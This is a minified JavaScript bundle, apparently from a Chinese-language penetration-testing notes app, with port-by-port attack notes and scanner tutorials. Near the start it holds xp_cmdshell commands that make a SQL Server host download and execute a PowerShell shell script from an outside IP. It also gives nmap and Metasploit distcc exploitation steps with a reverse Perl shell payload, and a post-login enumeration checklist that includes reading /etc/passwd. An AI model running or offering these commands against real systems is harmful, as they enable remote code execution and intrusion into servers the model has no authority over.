",`Win10\u7248\u672C\uFF1Axp_cmdshell " powershell 'IEX (New-Object Net.WebClient).DownloadString(\\"http://104.198.9.12/shell.ps1\\");' "`),a.a.createElement(a.a.Fragment,null,"		",'Win\u670D\u52A1\u5668\u7248\u672C\uFF1Axp_cmdshell " powershell "IEX (New-Object Net.WebClient).DownloadString(\\"http://104.198.9.12/shell.ps1\\");" "'),"			\u5982\u679C\u662F\u3010https\u534F\u8BAE\u3011\uFF0C\u5219\u53EA\u80FD\u7528\u57DF\u540D","			\u52A8\u6001\u52A0\u8F7D\u811A\u672C\uFF0C\u5E76\u6267\u884C"]}},{port:1801,name:{cn:"",fullForm:""},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:3306,name:{cn:"MYSQL\u6570\u636E\u5E93",fullForm:"My Structured Query Language"},short:{service:"",baseUsage:""},detail:{detailUsage:[],weak:[],relatedUtils:[]}},{port:3632,name:{cn:"Distcc\u5206\u5E03\u5F0F\u7F16\u8BD1",fullForm:"My Structured Query Language"},short:{service:"distccd",baseUsage:"\u5B83\u4EC5\u652F\u6301\u57FA\u4E8EIP\u7684\u8EAB\u4EFD\u9A8C\u8BC1\uFF0C\u9ED8\u8BA4\u60C5\u51B5\u4E0B\u5141\u8BB8\u6240\u6709\u8EAB\u4EFD\u9A8C\u8BC1\u3002"},detail:{references:[a.a.createElement(a.a.Fragment,null,"\u7AEF\u53E3\u5229\u7528\uFF1A",o("3632 - Pentesting distcc - HackTricks","https://book.hacktricks.xyz/pentesting/3632-pentesting-distcc"))],detailUsage:[],weak:["\u4E00\u822C\u6765\u8BF4\uFF0C\u9664\u4E86\u8BA9\u5176\u4ED6\u4EBA\u4F7F\u7528\u60A8\u7684\u786C\u4EF6 \u6765\u52A0\u901F\u4ED6\u4EEC\u7684\u7F16\u8BD1\u8FC7\u7A0B\u5916\uFF0C\u5B83\u6CA1\u6709\u5176\u4ED6\u5371\u5BB3\u3002"],relatedUtils:[`1.\u3010\u63A2\u6D4B\u811A\u672C\u3011nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'`,`	1.\u5982\u679C\u8BE5\u6307\u4EE4\u4E0D\u884C\uFF0C\u5219\u53EF\u4EE5\u6362\u7528\u3010nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687.nse --script-args="distcc-exec.cmd='id'" -Pn\u3011`,"2.\u3010\u6267\u884C\u653B\u51FB\u3011msf5 > use exploit/unix/misc/distcc_exec","	1.\u4F7F\u7528\u3010cmd/unix/reverse_perl\u3011\uFF0C\u4F5C\u4E3A\u3010payload\u3011\uFF0C\u662F\u76EE\u524D\u6BD4\u8F83\u597D\u4F7F\u7528\u7684"," "]}},{port:5985,name:{cn:"WinRM\u8FDC\u7A0B\u7BA1\u7406",fullForm:"Windows Remote Management"},short:{service:"\uFF1F\uFF1F",baseUsage:"\u5141\u8BB8\u8DE8\u7F51\u7EDC\uFF0C\u8BBF\u95EE\u6216\u4EA4\u6362\uFF0C\u7BA1\u7406\u4FE1\u606F\u3002"},detail:{detailUsage:[],weak:[],relatedUtils:[]}}];c.checkPortPairs(A)},iLN1:function(j,m,e){"use strict";e.r(m);var P=e("/zsF"),n=e("PArb"),r=e("oBTY"),a=e("q1tI"),t=e.n(a),o=e("tMyG"),i=e("9kvl"),c=e("ysNt"),A=e("tJVT"),F=e("fWQN"),C=e("mtLc"),y=e("vhfr"),w=c.a.singleATag_blank,p;(function(g){})(p||(p={}));var S;(function(g){})(S||(S={}));var l;(function(g){var v,U,d,L,N,R,O,H,$=(v=Object(y.a)(),v(U=(L=d=function(){function b(){Object(F.a)(this,b)}return Object(C.a)(b,null,[{key:"transform_CfgFile",value:function(Q){return Q.split(`
`).map(function(V){var X=V.split(":"),_=Object(A.a)(X,7),Y=_[0],J=_[1],Z=_[2],q=_[3],tt=_[4],et=_[5],at=_[6];return{name:Y,pwd:J,id:Z,gid:q,comment:tt,homeDir:et,bash:at}})}}]),b}(),d.users=[{username:"root",desc:"\u8D85\u7EA7\u7BA1\u7406\u5458"},{username:"games",desc:"--"},{username:"mail",desc:"--"},{username:"mysql",desc:"\u6570\u636E\u5E93"},{username:"postgres",desc:"\u6570\u636E\u5E93"},{username:"snmp",desc:"\u7F51\u7EDC\u7BA1\u7406\u534F\u5B9A"},{username:"distccd",desc:"distcc\u76F8\u5173\u8D26\u6237\uFF0CDistcc\u5206\u5E03\u5F0F\u7F16\u8BD1"},{username:"tomcat",desc:"\u7F51\u7EDC\u670D\u52A1\u5668"},{username:"ftp",desc:"\u8FDC\u7A0B\u6587\u4EF6\u4F20\u8F93\u3001\u5B58\u50A8"},{username:"sshd",desc:"\u8FDC\u7A0BSSH\u8FDE\u63A5"},{username:"dhcp",desc:"\u52A8\u6001\u57DF\u540D\u89E3\u6790"},{username:"www-data",desc:"Web\u7F51\u7AD9\u7684\u6587\u4EF6"},{username:"irc",desc:"\u7FA4\u804A\u5929\u670D\u52A1\u3001\u70B9\u5BF9\u70B9\u804A\u5929\u670D\u52A1"}],d.mustDoAfterLogin=["\u3010whoami\u3011\uFF0C\u786E\u8BA4\u81EA\u8EAB\u8EAB\u4EFD\u3002","\u3010ls -al\u3011\uFF0C\u9A6C\u4E0A\u67E5\u770B\u81EA\u8EAB\u73AF\u5883\u3002","\u3010id\u3011\uFF0C\u67E5\u770B\u81EA\u8EAB \u7528\u6237ID\u3001\u7528\u6237\u7EC4 \u3002","\u3010sudo -l\u3011\uFF0C\u67E5\u770B\u81EA\u8EAB \u3010superuser\u3011\u6743\u9650 \u3002","\u3010cat /etc/passwd\u3011\uFF0C\u67E5\u770B\u672C\u673A\u6240\u6709\u7528\u6237","\u3010ls -al <Home\u6587\u4EF6\u5939>\u3011\uFF0C\u67E5\u770B \u7528\u6237Home\u6587\u4EF6\u5939","	 1.\u6700\u597D\uFF0C\u628A \u6240\u6709\u7528\u6237 Home\u6587\u4EF6\u5939\uFF0C\u90FD\u67E5\u770B\u4E00\u904D","\u3010find /var -group <\u81EA\u8EAB\u7EC4>\u3011","\u3010find /etc -group <\u81EA\u8EAB\u7EC4>\u3011",t.a.createElement(t.a.Fragment,null,"\u4F7F\u7528\u3010\u5168\u5C40\u641C\u7D22\u5229\u5668\u3011\uFF0C\u641C\u7D22\u3010\u654F\u611F\u5173\u952E\u5B57\u3011\u3002\u6682\u65F6\u7248\u672C\uFF1A\u89C1",w("Linux \xB7 (4) \u6240\u6709Linux\u547D\u4EE4\u7684\u5B66\u4E60","https://github.com/hanshou101/WangPan/blame/95098e5a4ea4f0f28f3f0a8c863074489a99a8e3/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0-Teambition/Linux%20%C2%B7%20(4)%20%E6%89%80%E6%9C%89Linux%E5%91%BD%E4%BB%A4%E7%9A%84%E5%AD%A6%E4%B9%A0.md#L69"))],d.groups=[{groupname:"lxd",desc:"Linux\u5BB9\u5668\u7528\u6237\u7EC4\uFF1B\u9AD8\u6743\u9650\u3002"},{groupname:"sambashare",desc:"Samba\uFF0C\u5171\u4EAB\u7EC4"}],L))||U);g.Linux=$;var G=(N=Object(y.a)(),N(R=(H=O=function(){function b(){Object(F.a)(this,b)}return Object(C.a)(b,null,[{key:"transform_CfgFile",value:function(){return[]}}]),b}(),O.mustDoAfterLogin=[""],O.users=[{username:"admin",desc:"\u7BA1\u7406\u5458"},{username:"administrator",desc:"\u8D85\u7EA7\u7BA1\u7406\u5458"},{username:"system",desc:"\u7CFB\u7EDF\u5185\u6838\u7EA7\uFF0C\u8D85\u7EA7\u6743\u9650"}],O.groups=[{groupname:"administrators",desc:"\u8D85\u7EA7\u7BA1\u7406\u5458\u7EC4"}],H))||R);g.Windows=G})(l||(l={}));var f=e("pkbI"),h=e("6r9T"),I=e("P9cN"),E=c.a.tutorial,T=E.descLinks,u=E.descTexts,M=E.genUtilUI,W=E.genLinkUI,B=E.genUtilUI_outdatedFn,s=c.a.singleATag_blank,D=[f.a.addToBasic(h.b.server,{keywords:"\u3010nmap\u3011\u7EFC\u5408\u626B\u63CF",desc:u(["\u601D\u8DEF\uFF1A","\u5E38\u89C4\u626B\u63CF\uFF1A","\u79D8\u5BC6\u626B\u63CF\uFF1A","\u811A\u672C\u4F7F\u7528\uFF1A","\u5176\u5B83\u5E38\u89C1\u9009\u9879"])}),{keywords:"\u3010netdiscover\u3011\u53D1\u73B0\u8303\u56F4\u5185\u7684\u6D3B\u8DC3\u4E3B\u673A",desc:u([])},{keywords:"\u3010masscan\u3011\u5927\u89C4\u6A21\u9AD8\u901F\u626B\u63CF",desc:u([])},{keywords:"\u3010nikto\u3011\u4E00\u4E2A\u5165\u95E8\u7EA7\u7684\u3001\u5DF2\u8FC7\u65F6\u7684\u7B80\u964B\u626B\u63CF\u5668",desc:u([])},{keywords:"\u3010nessus\u3011\u5B89\u5168\u8584\u5F31\u70B9\u626B\u63CF",desc:u([])},f.a.addToBasic(h.b.server,{keywords:"\u3010ping\u901A\u3011ping \u548C\u7C7Bping\u5DE5\u5177",desc:u([])}),{keywords:"\u3010IPv6\u3011\u53D1\u73B0\u5DE5\u5177",desc:u([])},{keywords:"\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u7ED8\u5236IP\u8DF3\u8F6C\u8DEF\u5F84\u3001\u5916\u90E8\u7F51\u7EDC\u62D3\u6251\u7ED3\u6784\u3001\u53D1\u73B0\u9632\u706B\u5899\u8FC7\u6EE4\u5668",desc:Object(r.a)(u([]))},f.a.addToBasic(h.b.server,{keywords:"\u3010WAF\u9632\u706B\u5899/ IDS/ IPS\u3011",desc:Object(r.a)(u([]))}),{keywords:"\u3010WAF\u8BBE\u8BA1\u601D\u8DEF\u3011(\u9632\u5B88\u65B9)",desc:Object(r.a)(u(["\u81EA\u7814\u601D\u8DEF\uFF1A",t.a.createElement(t.a.Fragment,null,"	",s("\u7532\u65B9\u81EA\u7814\u5206\u5E03\u5F0FWAF\u843D\u5730\u5168\u7A0B\u5B9E\u5F55 - FreeBuf\u7F51\u7EDC\u5B89\u5168\u884C\u4E1A\u95E8\u6237","https://www.freebuf.com/articles/es/245977.html")),"\u56FD\u5185WAF\u5F00\u6E90\u6846\u67B6\uFF1A",t.a.createElement(t.a.Fragment,null,"	",s("OpenResty","https://github.com/openresty/openresty"))]))}],k=[{keywords:"\u3010w3af\u3011\u4E00\u4E2A2015\u5E74\u5DF2\u8FC7\u65F6\u7684\u6F0F\u6D1E\u626B\u63CF\u5668",desc:u([t.a.createElement(t.a.Fragment,null,"2015\u5E74\uFF0C\u5DF2\u7ECF\u505C\u6B62\u4E86\u66F4\u65B0 \uFF08",s("\u94FE\u63A52","https://en.wikipedia.org/wiki/W3af"),"\u3001",s("\u94FE\u63A52","https://github.com/andresriancho/w3af"),"\uFF09"),"\u4EE5\u524D\u7684\u4F18\u52BF\uFF1A","	\u6BD4\u5176\u5B83\u6846\u67B6\uFF0C\u66F4\u5B89\u5168\u79D8\u5BC6","	\u626B\u63CF\u901F\u5EA6\u8F83\u6162","	\u5728\u957F\u65F6\u95F4\u6D4B\u8BD5\u4E2D\uFF0C\u5F88\u5BB9\u6613\u51FA\u6545\u969C\u5F02\u5E38"])},{keywords:"\u3010nexpose\u3011\u5546\u7528\u7684\u6F0F\u6D1E\u626B\u63CF\u5668",desc:u([t.a.createElement(t.a.Fragment,null,"\u8D26\u53F7\u6CE8\u518C\uFF1A",s("\u6CE8\u518C","https://www.rapid7.com/products/nexpose/request/")),"	\u7528\u3010Zoho\u514D\u8D39\u4F01\u4E1A\u90AE\u7BB1\u3011\u6CE8\u518C\u8D26\u53F7","	\u6CE8\u518C\u4E4B\u540E\uFF0C\u63D0\u793A\u9700\u8981\u30101-2\u5929\u3011\u7684\u5BA1\u6838\u671F","	\u5B9E\u9645\u4E0A\uFF0C\u8FC7\u4E86\u6574\u65746\u5929\u540E\uFF081\u670816\u2014\u20141\u670822\uFF09\uFF0C\u6211\u624D\u6536\u5230\u5546\u8C08\u5408\u4F5C\u7684\u90AE\u4EF6",t.a.createElement(t.a.Fragment,null,"\u5269\u4E0B\u7684\u4E00\u4E9B\u5B89\u88C5\u8D44\u6599 \uFF08",s("1","https://an4ndita.medium.com/using-basic-vulnerability-scanners-9208ea6f7757"),"\u3001",s("2","https://www.javatpoint.com/ethical-hacking-installing-nexpose"),"\u3001",s("3","https://docs.rapid7.com/nexpose/install/"),"\uFF09"),"	"])},{keywords:"\u3010openvas\u3011\u57FA\u4E8Enessus\uFF08\u4F46\u5B89\u88C5\u7EF4\u62A4\u9EBB\u70E6\uFF09",desc:u(["\u5DF2\u7ECF\u4ECE openvas \u5347\u7EA7\u4E3A\u4E86 gvm","\u91CD\u65B0\u5B89\u88C5\u65B9\u5F0F\uFF1A","	sudo apt install gvm","	sudo gvm-setup","		\u7528\u4E8E\u521D\u59CB\u5316\u8BBE\u7F6E",t.a.createElement(t.a.Fragment,null,"		","\u5982\u679C\u62A5\u9519\u3010use pg_upgradecluster to update your postgres cluster\u3011\uFF0C\u5219\u6309\u7167\u4EE5\u4E0B\u5904\u7406\uFF08",s("\u94FE\u63A51","https://community.greenbone.net/t/gvm-install-setting-on-kali-linux-2020-3/7298"),"\u3001",s("\u94FE\u63A52\uFF08\u8BF4\u6CD5\u6709\u70B9\u5751\u4EBA\uFF0C\u660E\u660E\u5207\u6362\u7AEF\u53E3\u5C31\u53EF\u4EE5\u4E86\uFF09","https://www.cnblogs.com/GKLBB/p/13901148.html"),"\uFF09"),t.a.createElement(t.a.Fragment,null,"			","\u4E4B\u540E\u53C8\u51FA\u4E86\u70B9\u95EE\u9898\uFF08\u540E\u9762\u8FD8\u9700\u8981",s("\u8865\u5145\u94FE\u63A53","https://www.reddit.com/r/Kalilinux/comments/jfitq5/openvas_install_errors/ga2e43c?utm_source=share&utm_medium=web2x&context=3"),"\u3001",s("\u8865\u5145\u94FE\u63A54","https://dannyda.com/2020/08/07/how-to-fix-openvas-command-not-found-in-kali-linux-2020-2a/?__cf_chl_captcha_tk__=82679cecfa04a51ee31d2afbf74c28456b075e8d-1610711705-0-AeF32vcAYNWm7D9kGnNyG1YoCCpsAslYoN7gujSBikdbzgIyce7IaBp98tmBQUkQnvF9uLHPssreeRVZYK-Efz3A1zM2G_7L178Vc2i-W4D1JZw3gFlrH3xt5816WxPA3HzVRXJtbesGC-7S5tbDkuRgx3btFhC1xWre0Otqo_xK4PhNuupVKYCVpDEN1wuCAdgAKEoX5Wuw6byDGCe3-QHzcWbHgRaBGGlQEm6OWG5xD631GESr4mK4H6dyfyDRP7U3KwkTl4HwmADIsnECwjUIbA7x1aewHGCR_I9-oekXco6niKrmJsVgq6-Cho4w0RfBz83rb0_Qy4LbXMaL97G_gosA-7smNKezrUz8PVllT1luytN06qmkiW1hPplbKcVUZne4UkgZCrxcIQg7q4bINYz3Zz9M6uk9n2uFpqsGj5acLtkEJVwcH_bigxGSaOFCreAj3N7B13MayILytyfJe_W-GVsX4B0_q2Lw-2eI85HmpK9r14UOngVqQ0275YBkjmCWfSMIVKg5kZqU4_07B7jaqoPBqDT0AlvKNg4uvwmgCv1AlQvdgFvQULZ-GPiOA120CaQI2PHMpXLC7YKYg4jDvSu6PLNWV_98Lz9F"),"\uFF09\uFF1A"),"				\u7F16\u8F91\u3010/etc/postgresql/13/main/postgresql.conf\u3011\u5230\u3010\u7AEF\u53E35432\u3011","					\u5C06\u3010\u539F\u672C11\u76845432\u3011\u548C\u3010\u539F\u672C12\u76845433\u3011\u548C\u3010\u539F\u672C13\u76845434\u3011\uFF0C\u8FDB\u884C\u8C03\u6362","				\u518D\u6267\u884C sudo systemctl restart postgresql","				\u7136\u540E\u5C31\u771F\u6B63\u53EF\u4EE5\u4E86\u3002","		\u7ECF\u8FC7\u4E865\u4E2A\u591A\u5C0F\u65F6\uFF0C\u7EC8\u4E8E\u5B89\u88C5\u5B8C\u6BD5\u4E86\u3002","	sudo openvas-check-setup",t.a.createElement(t.a.Fragment,null,"		","\u62A5\u9519\u3010failed to connect to feed.community.greenbone.net\u3011\uFF1B\u7ECF\u67E5\u8BE2\u8BE5\u66F4\u65B0\u901A\u9053\u5DF2\u5173\u95ED\uFF08",s("\u94FE\u63A5","https://community.greenbone.net/t/shutting-down-gcf-http-download/5339"),"\uFF09"),"		\u7B97\u4E86\uFF0C\u5148\u6682\u65F6\u4E0D\u7BA1\u8FD9\u4E2A\u6307\u4EE4\u4E86","	sudo gvm-start","		\u65E0\u6CD5\u542F\u52A8\uFF0C\u901A\u8FC7\u3010systemctl status gvmd.service\u3011\u67E5\u770B\uFF0C\u62A5\u9519\u4E3A\u3010gvmd.service: Can't open PID file /run/gvm/gvmd.pid\u3011",t.a.createElement(t.a.Fragment,null,"		","\u6267\u884C\u3010sudo gvm-check-setup\u3011\u8FDB\u884C\u68C0\u67E5\uFF1A\uFF08",s("\u94FE\u63A51","https://community.greenbone.net/t/not-able-to-create-admin-account-gvm-start-not-running-due-to-several-errors-in-kali-linux/6141/9"),"\u3001",s("\u94FE\u63A52","https://bugs.kali.org/view.php?id=6615#c13164"),"\uFF09"),"			\u6307\u51FA\u4E86\u95EE\u9898\uFF0C\u5E76\u7ED9\u51FA\u4E86\u89E3\u51B3\u65B9\u6848\u3002","			\u540E\u9762\u7EE7\u7EED\u62A5\u9519\u3010createdb: could not connect to database template1: could not connect to server: No such file or directory\u3011\uFF0C\u6211\u61D2\u5F97\u89E3\u51B3\u8FD9\u4E2A\u95EE\u9898\u4E86\u3002\u82B1\u4E86\u592A\u591A\u65F6\u95F4\u3002","\u82B1\u8D39\u4E86\u592A\u591A\u65F6\u95F4\uFF0C\u8FD9\u4E2A\u8F6F\u4EF6\u7684\u751F\u6001\u3001\u793E\u533A\u505A\u7684\u592A\u70C2\u4E86","	\u540E\u7EED\u7684\u89E3\u51B3\u65B9\u6848\uFF0C\u53EF\u80FD\u9020\u6210\u4EE5\u4E0B\u540E\u679C\uFF1A","		\u5220\u9664\u4E4B\u524D gvm \u4E94\u4E2A\u5C0F\u65F6\u5B89\u88C5\u7684\u5305","		\u91CD\u65B0\u5B89\u88C5postgresql\uFF08\u9700\u8981\u5220\u9664 gvm \u7684\u5305\uFF09","		\u91CD\u65B0\u5B89\u88C5kali\u7CFB\u7EDF\uFF1F\uFF1F\uFF1F"])}],x=[{keywords:"\u3010\u771F\u5B9EIP\u67E5\u8BE2\u3001\u6D4B\u901F\u3011",desc:T([])},{keywords:"\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u7ED8\u5236IP\u8DF3\u8F6C\u8DEF\u5F84\u3001\u5916\u90E8\u7F51\u7EDC\u62D3\u6251\u7ED3\u6784\u3001\u53D1\u73B0\u9632\u706B\u5899\u8FC7\u6EE4\u5668",desc:T([])},{keywords:"\u3010\u5F00\u653E\u7AEF\u53E3\u3011",desc:T([])}],K=function(v){var U=v.dispatch,d=v.listAndproject.list,L=function(){U({type:"listAndproject/fetch",payload:{}})};return Object(a.useEffect)(function(){L()},[]),console.log("\u6D4B\u8BD5\u65B9\u6CD5",l.Linux.transform_CfgFile("root:x:0:0:root:/root:/bin/bash")),t.a.createElement(o.a,{content:t.a.createElement("div",{style:{whiteSpace:"pre-line"}},`
         \u670D\u52A1\u5668\u57FA\u672C\u4FE1\u606F\u626B\u63CF

         \u3010\u521D\u6B65\u771F\u5B9EIP\u3011ping\uFF08\u4EE5\u53CA IPv6\u9519\u8BEF\u914D\u7F6E\uFF09\uFF08\u5730\u7406\u4F4D\u7F6E\uFF09
         \u3010\u7CFB\u7EDF\u7C7B\u578B\u3011\u3001\u3010\u7CFB\u7EDF\u7248\u672C\u3011
         \u3010\u5F00\u653E\u7AEF\u53E3\u3011
         \u3010WAF\u9632\u706B\u5899/ IDS/ IPS\u3011Web Application Firewall
          `,t.a.createElement(n.a,{type:"horizontal"}),t.a.createElement("h1",null,"\u5DE5\u5177"),t.a.createElement("div",null,D.map(M)),t.a.createElement(n.a,{type:"horizontal"}),t.a.createElement("h1",null,"\u7F51\u7AD9"),t.a.createElement("div",null,x.map(W)),t.a.createElement(n.a,{type:"horizontal"}),t.a.createElement("div",null,k.map(B())))},t.a.createElement(I.a,{projectList:d}))},st=m.default=Object(i.c)(function(g){var v=g.listAndserver,U=g.listAndproject,d=g.loading;return{listAndserver:v,listAndproject:U,isLoading:d==null?void 0:d.models.listAndserver}})(K)},vhfr:function(j,m,e){"use strict";e.d(m,"a",function(){return P});function P(){return function(n){}}}}]);
